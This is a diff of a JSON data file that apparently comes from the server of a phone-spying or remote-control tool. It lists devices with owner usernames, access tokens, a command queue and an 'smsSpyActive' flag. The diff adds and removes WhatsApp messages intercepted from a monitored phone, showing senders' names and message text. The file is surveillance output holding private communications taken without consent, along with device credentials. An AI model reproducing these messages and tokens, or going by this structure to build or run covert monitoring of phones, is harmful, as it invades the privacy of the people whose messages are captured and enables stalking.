@@ -4,7 +4,7 @@
     "deviceName": "HP-JASZ_X-CA6D",
     "ownerUsername": "c6d90c96-224f-4890-a851-0704858e64df",
     "token": "1505d9de1a287ae732b4f22d45e58506",
-    "lastSeen": 1777176967101,
+    "lastSeen": 1777176976563,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T03:08:43.334Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "jas",
+        "content": "dapet salam dari mantan",
+        "time": "26/04 12:27",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777176979069
+      },
       {
         "appName": "WhatsApp",
         "sender": "memet",
@@ -4011,14 +4019,6 @@
         "time": "26/04 11:22",
         "pkg": "com.whatsapp",
         "receivedAt": 1777173100455
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝐉𝐁 𝟏  || 𝐊𝐈𝐍𝐆 𝐕𝐀𝐋𝐙  ✨ (95 pesan): ~ Hudzz Sturee",
-        "content": "📷 op?30+ gb+sl angkut sumua mc/direct bebas",
-        "time": "26/04 11:22",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777173100399
       }
     ],
     "galleryPhotos": [],
@@ -4037,7 +4037,7 @@
     "deviceName": "HP-MEMEM-A001",
     "ownerUsername": "RIXX09",
     "token": "fb008139c6083d4cb9aa61f99b737696",
-    "lastSeen": 1777176966003,
+    "lastSeen": 1777176977882,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T03:56:32.130Z",
